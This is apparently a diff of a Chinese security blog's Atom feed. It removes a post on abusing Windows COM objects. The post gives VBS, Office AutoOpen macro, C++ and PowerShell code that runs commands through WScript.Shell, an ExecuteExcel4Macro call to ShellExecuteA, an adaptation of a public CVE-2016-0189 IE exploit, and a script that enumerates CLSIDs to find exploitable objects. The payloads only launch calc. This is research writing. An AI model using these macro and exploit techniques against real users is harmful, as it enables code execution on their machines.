+<p>然而在实际利用过程中，对于IE多线程并不熟悉，web worker在IE11并不能正确执行，如果有其他方式能够创建多线程占位内存的话则能够利用该漏洞。</p>]]></content><author><name>Joey</name></author><category term="漏洞利用" /><summary type="html"><![CDATA[前言 分析该漏洞的原因是看到ZDI的这篇分析文章：CVE-2018-8460: EXPOSING A DOUBLE FREE IN INTERNET EXPLORER FOR CODE EXECUTION。里面详细分析了该漏洞的原理和利用思路，但是没有EXP，因此想尝试自己写出EXP。虽然最终没有成功写出EXP，但还是把学习的过程记录了下来，作为一个积累。]]></summary></entry><entry><title type="html">微软MSDT远程代码执行漏洞 CVE-2022-30190 分析</title><link href="http://localhost:4000/2022-06-10/CVE-2022-30190" rel="alternate" type="text/html" title="微软MSDT远程代码执行漏洞 CVE-2022-30190 分析" /><published>2022-06-10T00:00:00+08:00</published><updated>2022-06-10T00:00:00+08:00</updated><id>http://localhost:4000/2022-06-10/CVE-2022-30190</id><content type="html" xml:base="http://localhost:4000/2022-06-10/CVE-2022-30190"><![CDATA[<h1 id="前言">前言</h1>
 
 <p>在分析漏洞的过程中，陆陆续续看到许多师傅的分析文章，于是参考之后结合自己的分析总结了一下。<!--more--></p>
 
@@ -2505,266 +4718,4 @@ msvbvm60!IID_IVbaHost+0x127eb:
 
 <p>[4] <a href="https://www.tarlogic.com/blog/exploiting-word-cve-2017-11826/">Exploiting Word: CVE-2017-11826</a></p>
 
-<p>[5] <a href="https://www.anquanke.com/post/id/103080">Open XML标签解析类漏洞分析思路</a></p>]]></content><author><name>Joey</name></author><category term="漏洞分析" /><summary type="html"><![CDATA[前言 最近开始分析Office漏洞，拿到CVE-2017-11826的样本后发现无法在Office2010上成功执行，打算分析并改造该EXP。参考了许多资料，结合自己的理解写了本文，供大家学习和参考。]]></summary></entry><entry><title type="html">COM对象的利用与挖掘</title><link href="http://localhost:4000/2021-07-28/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98" rel="alternate" type="text/html" title="COM对象的利用与挖掘" /><published>2021-07-28T00:00:00+08:00</published><updated>2021-07-28T00:00:00+08:00</updated><id>http://localhost:4000/2021-07-28/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98</id><content type="html" xml:base="http://localhost:4000/2021-07-28/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98"><![CDATA[<h1 id="前言">前言</h1>
-
-<p>本文在FireEye的研究<a href="https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html">Hunting COM Objects[1]</a>的基础上，讲述COM对象在IE漏洞、shellcode和Office宏中的利用方式以及如何挖掘可利用的COM对象，获取新的漏洞利用方式。<!--more--></p>
-
-<h1 id="com对象简述">COM对象简述</h1>
-
-<p>COM(微软组件对象模型)，是一种独立于平台的分布式系统，用于创建可交互的二进制软件组件。 COM 是 Microsoft 的 OLE (复合文档) 和 ActiveX (支持 Internet 的组件) 技术的基础技术。</p>
-
-<p>注册表项：<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID</code>下，包含COM对象的所有公开的信息，图中显示了Wscript.Shell对象在注册表中的信息：</p>
-
-<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/Wscript.Shell对象.png" alt="Wscript.Shell对象" /></p>
-
-<p>其中<code class="language-plaintext highlighter-rouge">{72C24DD5-D70A-438B-8A42-98424B88AFB8}</code>就是该对象的CLSID。如果将COM对象比作人的话，CLSID就相当于身份证号，每个COM对象的CLSID都是唯一且不重复的。当然，如果只有身份证号，会有很多不方便的情况，于是便有自己的名字。COM对象中的ProgID就相当于它的名字，图中的COM对象ProgID为WScript.Shell.1：</p>
-
-<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/ProgID.png" alt="ProgID" /></p>
-
-<p>而InProcServer32表示该COM对象位于哪个PE文件中，图中表示WScript.Shell对象位于<code class="language-plaintext highlighter-rouge">C:\Windows\System32\wshom.ocx</code>中：</p>
-
-<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/InProcServer32.png" alt="InProcServer32" /></p>
-
-<p>有了上述的信息后，接下来便可以通过这些信息去使用COM对象了。</p>
-
-<h1 id="com对象的利用">COM对象的利用</h1>
-
-<p>COM对象可以通过脚本语言（VBS、JS）、高级语言（C++）和powershell创建。接下来分别介绍这三种创建方式。</p>
-
-<h2 id="脚本语言创建com对象">脚本语言创建COM对象</h2>
-
-<p>通过脚本语言，我们可以很轻易的创建一个COM对象，使用VBS创建Wscript.Shell对象：</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dim Shell
-Set Shell = CreateObject("Wscript.Shell")
-Shell.Run "cmd /c calc.exe"
-</code></pre></div></div>
-
-<p>运行效果如图：</p>
-
-<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/运行VBS.png" alt="运行VBS" /></p>
-
-<p><code class="language-plaintext highlighter-rouge">CreateObject</code>方法使用COM对象的ProgID：Wscript.Shell来创建对象，创建完成后便能调用该对象的Run方法通过cmd起calc。除了使用ProgID，还可以使用Wscript.Shell对象的CLSID来创建：</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dim Shell
-Set Shell = GetObject("new:72C24DD5-D70A-438B-8A42-98424B88AFB8")
-Shell.Run "cmd /c calc.exe"
-</code></pre></div></div>
-
-<p>这种方法的好处是当想要创建的COM对象没有ProgID时，便可以通过CLSID进行创建。接下来对<a href="https://github.com/theori-io/cve-2016-0189/blob/master/exploit/vbscript_godmode.html">CVE-2016-0189[2]</a>的EXP进行改造，将EXP中如下vbs代码替换成创建Wscript.Shell即可。</p>
-
-<p>替换前：</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' Execute cmd
-Set Object = CreateObject("Shell.Application")
-Object.ShellExecute "cmd"
-</code></pre></div></div>
-
-<p>替换后：</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' Execute cmd
-Dim Shell
-Set Shell = CreateObject("Wscript.Shell")
-Shell.Run "cmd /c calc.exe"
-</code></pre></div></div>
-
-<p>最终实现效果：</p>
-
-<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/改造EXP.png" alt="改造EXP" /></p>
-
-<p>接下来讲述COM对象在Office宏中的利用，以Office2019为例，在word文档中创建如下宏代码：</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Sub AutoOpen()
-Dim Shell
-Set Shell = CreateObject("Wscript.Shell")
-Shell.Run "cmd /c calc.exe"
-End Sub
-</code></pre></div></div>
-
-<p>打开文件后，会提示宏已被禁用：</p>
-
-<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/宏安全提示.png" alt="宏安全提示" /></p>
-
-<p>点击启用宏后，使用cmd起计算器：</p>
-
-<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/word起calc.png" alt="word起calc" /></p>
-
-<p>用法和IE中一致，就不再赘述了。</p>
-
-<h2 id="通过高级语言创建com对象">通过高级语言创建COM对象</h2>
-
-<p>如果想通过高级语言（这里以C++为例）使用COM对象的话，必须要明白微软定义的COM三大接口类：<a href="https://docs.microsoft.com/en-us/windows/win32/api/unknwn/nn-unknwn-iunknown">IUnknown[3]</a>、<a href="https://docs.microsoft.com/en-us/windows/win32/api/unknwnbase/nn-unknwnbase-iclassfactory">IClassFactory[4]</a>和<a href="https://docs.microsoft.com/en-us/windows/win32/api/oaidl/nn-oaidl-idispatch">IDispatch[5]</a>。</p>
-
-<p>参考<a href="https://blog.csdn.net/weiwangchao_/article/details/6949264">COM三大接口:IUnknown、IClassFactory、IDispatch[6]</a>一文。COM规范规定任何组件、任何接口都必须从IUnknown继承，IUnknown内包含3个函数：QueryInterface、AddRef和Release。QueryInterface用于查询组件实现的其它接口，AddRef用于增加引用计数，Release用于减少引用计数。根据本人的理解，QueryInterface用来获取IClassFactory类的的接口，AddRef和Release用于控制装载后InProcServer32所在PE文件的生命周期。当引用计数大于0时，内存中始终存在一个PE文件可以创建COM对象，当引用计数等于0时，系统会将内存中的PE文件释放掉，也就无法对该COM对象进行任何操作了。</p>
-
-<p>IClassFactory的作用是创建COM组件，通过类中CreateInstance函数即可创建一个可以使用的COM对象。有了对象还不够，必须要使用对象中的各种函数来执行功能，于是便要使用IDispatch接口类来获取函数和执行函数。</p>
-
-<p>IDispatch叫做调度接口，IDispatch类中的GetIDsOfNames函数可以通过IClassFactory创建的COM对象的函数名获取对应的函数ID（IID），通过这个ID就可以使用IDispatch类中的Invoke函数来执行COM对象中方法。最后将相关的资源使用IUnknown-&gt;Release函数释放，即可完成一次完整的COM对象调用过程。图中所示就是具体的实现流程：</p>
-
-<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/image-20210630154827820.png" alt="word起calc" /></p>
-
-<p>不过在实际使用中，并不会直接使用IUnknown接口类的函数，因为极易因为程序员的疏忽忘记释放一个接口或者多释放一个接口导致错误，因此使用图中函数CoCreateInstance就能直接创建一个类的接口。也就是说一个函数封装了IUnknown类和IClassFactory类的功能，能够简化流程。</p>
-
-<p>下面是创建WScript.Shell对象，使用Run方法起powershell的完整代码：</p>
-
-<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define _WIN32_DCOM
-</span><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
-<span class="cp">#include</span> <span class="cpf">&lt;comdef.h&gt;</span><span class="cp">
-</span>
-<span class="cp">#pragma comment(lib, "stdole2.tlb")
-</span>
-<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="n">HRESULT</span> <span class="n">hres</span><span class="p">;</span>
-
-    <span class="c1">// Step 1: ------------------------------------------------</span>
-    <span class="c1">// 初始化COM组件. ------------------------------------------</span>
-
-    <span class="n">hres</span> <span class="o">=</span> <span class="n">CoInitializeEx</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">COINIT_MULTITHREADED</span><span class="p">);</span>
-
-    <span class="c1">// Step 2: ------------------------------------------------</span>
-    <span class="c1">// 初始化COM安全属性 ---------------------------------------</span>
-
-    <span class="n">hres</span> <span class="o">=</span> <span class="n">CoInitializeSecurity</span><span class="p">(</span>
-        <span class="nb">NULL</span><span class="p">,</span>
-        <span class="o">-</span><span class="mi">1</span><span class="p">,</span>                          <span class="c1">// COM negotiates service</span>
-        <span class="nb">NULL</span><span class="p">,</span>                        <span class="c1">// Authentication services</span>
-        <span class="nb">NULL</span><span class="p">,</span>                        <span class="c1">// Reserved</span>
-        <span class="n">RPC_C_AUTHN_LEVEL_DEFAULT</span><span class="p">,</span>   <span class="c1">// Default authentication </span>
-        <span class="n">RPC_C_IMP_LEVEL_IMPERSONATE</span><span class="p">,</span> <span class="c1">// Default Impersonation</span>
-        <span class="nb">NULL</span><span class="p">,</span>                        <span class="c1">// Authentication info</span>
-        <span class="n">EOAC_NONE</span><span class="p">,</span>                   <span class="c1">// Additional capabilities </span>
-        <span class="nb">NULL</span>                         <span class="c1">// Reserved</span>
-    <span class="p">);</span>
-    <span class="c1">// Step 3: ---------------------------------------</span>
-    <span class="c1">// 获取COM组件的接口和方法 -------------------------</span>
-    <span class="n">LPDISPATCH</span> <span class="n">lpDisp</span><span class="p">;</span>
-    <span class="n">CLSID</span> <span class="n">clsidshell</span><span class="p">;</span>
-    <span class="n">hres</span> <span class="o">=</span> <span class="n">CLSIDFromProgID</span><span class="p">(</span><span class="s">L"WScript.Shell"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">clsidshell</span><span class="p">);</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">FAILED</span><span class="p">(</span><span class="n">hres</span><span class="p">))</span>
-        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
-    <span class="n">hres</span> <span class="o">=</span> <span class="n">CoCreateInstance</span><span class="p">(</span><span class="n">clsidshell</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">CLSCTX_INPROC_SERVER</span><span class="p">,</span> <span class="n">IID_IDispatch</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">lpDisp</span><span class="p">);</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">FAILED</span><span class="p">(</span><span class="n">hres</span><span class="p">))</span>
-        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
-    <span class="n">LPOLESTR</span> <span class="n">pFuncName</span> <span class="o">=</span> <span class="s">L"Run"</span><span class="p">;</span>
-    <span class="n">DISPID</span> <span class="n">Run</span><span class="p">;</span>
-    <span class="n">hres</span> <span class="o">=</span> <span class="n">lpDisp</span><span class="o">-&gt;</span><span class="n">GetIDsOfNames</span><span class="p">(</span><span class="n">IID_NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pFuncName</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">LOCALE_SYSTEM_DEFAULT</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Run</span><span class="p">);</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">FAILED</span><span class="p">(</span><span class="n">hres</span><span class="p">))</span>
-        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
-    <span class="c1">// Step 4: ---------------------------------------</span>
-    <span class="c1">// 填写COM组件参数并执行方法 -----------------------</span>
-    <span class="n">VARIANTARG</span> <span class="n">V</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
-    <span class="n">V</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">vt</span> <span class="o">=</span> <span class="n">VT_BSTR</span><span class="p">;</span>
-    <span class="n">V</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">bstrVal</span> <span class="o">=</span> <span class="n">_bstr_t</span><span class="p">(</span><span class="s">L"cmd /c calc.exe"</span><span class="p">);</span>
-    <span class="n">DISPPARAMS</span> <span class="n">disParams</span> <span class="o">=</span> <span class="p">{</span> <span class="n">V</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span> <span class="p">};</span>
-    <span class="n">hres</span> <span class="o">=</span> <span class="n">lpDisp</span><span class="o">-&gt;</span><span class="n">Invoke</span><span class="p">(</span><span class="n">Run</span><span class="p">,</span> <span class="n">IID_NULL</span><span class="p">,</span> <span class="n">LOCALE_SYSTEM_DEFAULT</span><span class="p">,</span> <span class="n">DISPATCH_METHOD</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">disParams</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">FAILED</span><span class="p">(</span><span class="n">hres</span><span class="p">))</span>
-        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
-    <span class="c1">// Clean up</span>
-    <span class="c1">//--------------------------</span>
-    <span class="n">lpDisp</span><span class="o">-&gt;</span><span class="n">Release</span><span class="p">();</span>
-    <span class="n">CoUninitialize</span><span class="p">();</span>
-    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></div></div>
-
-<p>步骤一、二都是用来初始化调用COM对象，步骤三使用了CoCreateInstance创建了WScript.Shell对象的IDispatch类接口，使用GetIDsOfNames函数获得了Run函数的ID。步骤四通过函数ID使用Invoke函数执行了Run方法起calc，最终运行的效果和IE的EXP一致，这里就不再展示了。</p>
-
-<p>那么，如此复杂的方式相比VBS有什么好处呢？那就是可以将C++代码通过shellcode生成框架转化为shellcode，生成后的shellcode比VBS能用在更多的地方，更加灵活，至于如何将代码转换成shellcode本文就不再讲述了。</p>
-
-<h2 id="通过powershell创建com对象">通过powershell创建COM对象</h2>
-
-<p>接下来就是最后一种创建COM对象的方式：使用powershell创建COM对象。使用powershell一样可以分别通过ProgID和CLSID创建，使用<code class="language-plaintext highlighter-rouge">$shell = [Activator]::CreateInstance([type]::GetTypeFromProgID("WScript.Shell"))</code>命令可通过ProgID创建WSH对象，而使用<code class="language-plaintext highlighter-rouge">$shell = [Activator]::CreateInstance([type]::GetTypeFromCLSID("72C24DD5-D70A-438B-8A42-98424B88AFB8"))</code>则可以通过CLSID创建，下图是通过CLSID创建后的效果：</p>
-
-<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/powershell创建COM.png" alt="powershell创建COM" /></p>
-
-<p>通过这种创建COM对象的方式，我们便可以编写powershell脚本进行COM对象的遍历了，获取计算机中大部分COM对象的方法和属性了。</p>
-
-<h1 id="com对象的挖掘">COM对象的挖掘</h1>
-
-<p>这部分的内容参考了FIREEYE的研究进行，利用powershell脚本遍历COM对象的方式成功挖掘到一种利用方式，故此分享。</p>
-
-<h2 id="已公开com对象利用挖掘">已公开COM对象利用挖掘</h2>
-
-<p>首先需要遍历系统中所有COM对象的CLSID，于是编写powershell脚本，将CLSID输出到txt文本中：</p>
-
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">New-PSDrive</span><span class="w"> </span><span class="nt">-PSProvider</span><span class="w"> </span><span class="nx">registry</span><span class="w"> </span><span class="nt">-Root</span><span class="w"> </span><span class="nx">HKEY_CLASSES_ROOT</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nx">HKCR</span><span class="w">
-</span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">HKCR:\CLSID</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="w"> </span><span class="nt">-Skip</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">clsids.txt</span><span class="w">
-</span></code></pre></div></div>
-
-<p>生成的clsid.txt如图所示：</p>
-
-<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/clsid.png" alt="clsid" /></p>
-
-<p>接着利用这些clsid通过powershell创建对应的COM对象，并且使用Get-Member方法获取对应的方法和属性，并最终输出到文本中，pwoershell脚本如下：</p>
-
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$Position</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="w">
-</span><span class="nv">$Filename</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"clsid-members.txt"</span><span class="w">
-</span><span class="bp">$input</span><span class="n">Filename</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"clsids.txt"</span><span class="w">
-</span><span class="kr">ForEach</span><span class="p">(</span><span class="nv">$CLSID</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="n">Get-Content</span><span class="w"> </span><span class="bp">$input</span><span class="nx">Filename</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
-      </span><span class="n">Write-Output</span><span class="w"> </span><span class="s2">"</span><span class="si">$(</span><span class="nv">$Position</span><span class="si">)</span><span class="s2"> - </span><span class="si">$(</span><span class="nv">$CLSID</span><span class="si">)</span><span class="s2">"</span><span class="w">
-      </span><span class="n">Write-Output</span><span class="w"> </span><span class="s2">"------------------------"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-File</span><span class="w"> </span><span class="nv">$Filename</span><span class="w"> </span><span class="nt">-Append</span><span class="w">
-      </span><span class="n">Write-Output</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="nv">$CLSID</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-File</span><span class="w"> </span><span class="nv">$Filename</span><span class="w"> </span><span class="nt">-Append</span><span class="w">
-      </span><span class="nv">$handle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">activator</span><span class="p">]::</span><span class="n">CreateInstance</span><span class="p">([</span><span class="n">type</span><span class="p">]::</span><span class="n">GetTypeFromCLSID</span><span class="p">(</span><span class="nv">$CLSID</span><span class="p">))</span><span class="w">
-      </span><span class="nv">$handle</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Get-Member</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-File</span><span class="w"> </span><span class="nv">$Filename</span><span class="w"> </span><span class="nt">-Append</span><span class="w">
-      </span><span class="nv">$Position</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">1</span><span class="w">
-</span><span class="p">}</span><span class="w">
-</span></code></pre></div></div>
-
-<p>脚本运行期间可能会打开各种软件，甚至会退出，需要截取clsid重新运行。运行后的文本内容为：</p>
-
-<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/clsid-members.png" alt="clsid-members" /></p>
-
-<p>通过搜索关键词：execute、exec、和run，能够发现不少可以利用的COM对象。本人由于在研究宏相关的COM利用，于是尝试了关键字ExecuteExcel4Macro，结果意外的收获到了COM对象Microsoft.Office.Interop.Excel.GlobalClass：</p>
-
-<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/ExecuteExcel4Macro.png" alt="ExecuteExcel4Macro" /></p>
-
-<p>于是使用ExecuteExcel4Macro函数加载shell32.dll中的ShellExecuteA成功起calc：</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Sub Auto_Open()
-Set execl = GetObject("new:00020812-0000-0000-C000-000000000046")
-execl.ExecuteExcel4Macro ("CALL(""shell32"", ""ShellExecuteA"", ""JJJCJJH"", -1, 0, ""CALC"", 0, 0, 5)")
-End Sub
-</code></pre></div></div>
-
-<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/ExecuteExcel4Macro-calc.png" alt="ExecuteExcel4Macro-calc" /></p>
-
-<h2 id="未公开com对象利用挖掘">未公开COM对象利用挖掘</h2>
-
-<p>对于已经公开的COM对象挖掘较为容易，当面对未公开的COM对象时，就需要通过逆向挖掘利用。比如位于<code class="language-plaintext highlighter-rouge">C:\windows\system32\wat\watweb.dll</code>中的WatWeb.WatWebObject对象公开了一个名为LaunchSystemApplication的方法，在oleview中能看到需要3个参数：</p>
-
-<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/oleview.png" alt="oleview" /></p>
-
-<p>但仅凭这些信息无法确定该方法是否能起任意进程，于是逆向查看LaunchSystemApplication，由于有调试符号，因此可以直接定位到该方法：</p>
-
-<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/LaunchSystemApplication.png" alt="LaunchSystemApplication" /></p>
-
-<p>LaunchSystemApplication调用LaunchSystemApplicationInternal，进入查看发现调用了CreateProcess，有利用的可能：</p>
-
-<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/LaunchSystemApplicationInternal.png" alt="LaunchSystemApplicationInternal" /></p>
-
-<p>但是可以看到调用了IsApprovedApplication方法进行校验，进入查看：</p>
-
-<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/IsApprovedApplication.png" alt="IsApprovedApplication" /></p>
-
-<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/ExeName.png" alt="ExeName" /></p>
-
-<p>发现需要校验传入的字符串为slui.exe，同时会将该字符串附加到系统路径下，因此并不能随意执行进程。尽管最终没有利用成功，但是这种思路可以帮助分析其他未知的COM对象，挖掘到更多的利用方式。</p>
-
-<h1 id="结论">结论</h1>
-
-<p>COM对象功能强大，灵活便捷，可以用于浏览器、脚本、Office宏、shellcode和powershell。通过powershell遍历系统中的COM对象，结合逆向分析更有可能发现未公开的利用方式。</p>
-
-<h1 id="参考链接">参考链接</h1>
-
-<p>[1] <a href="https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html">FireEye-Hunting COM Objects</a></p>
-
-<p>[2] <a href="https://github.com/theori-io/cve-2016-0189/blob/master/exploit/vbscript_godmode.html">Github-Brian Pak-CVE-2016-0189-exploit</a></p>
-
-<p>[3] <a href="https://docs.microsoft.com/en-us/windows/win32/api/unknwn/nn-unknwn-iunknown">Microsoft-IUnknown接口说明文档</a></p>
-
-<p>[4] <a href="https://docs.microsoft.com/en-us/windows/win32/api/unknwnbase/nn-unknwnbase-iclassfactory">Microsoft-IClassFactory接口说明文档</a></p>
-
-<p>[5] <a href="https://docs.microsoft.com/en-us/windows/win32/api/oaidl/nn-oaidl-idispatch">Microsoft-IDispatch接口说明文档</a></p>
-
-<p>[6] <a href="https://blog.csdn.net/weiwangchao_/article/details/6949264">CSDN-COM三大接口:IUnknown、IClassFactory、IDispatch</a></p>]]></content><author><name>Joey</name></author><category term="漏洞利用" /><summary type="html"><![CDATA[前言 本文在FireEye的研究Hunting COM Objects[1]的基础上，讲述COM对象在IE漏洞、shellcode和Office宏中的利用方式以及如何挖掘可利用的COM对象，获取新的漏洞利用方式。]]></summary></entry></feed>
+<p>[5] <a href="https://www.anquanke.com/post/id/103080">Open XML标签解析类漏洞分析思路</a></p>]]></content><author><name>Joey</name></author><category term="漏洞分析" /><summary type="html"><![CDATA[前言 最近开始分析Office漏洞，拿到CVE-2017-11826的样本后发现无法在Office2010上成功执行，打算分析并改造该EXP。参考了许多资料，结合自己的理解写了本文，供大家学习和参考。]]></summary></entry></feed>
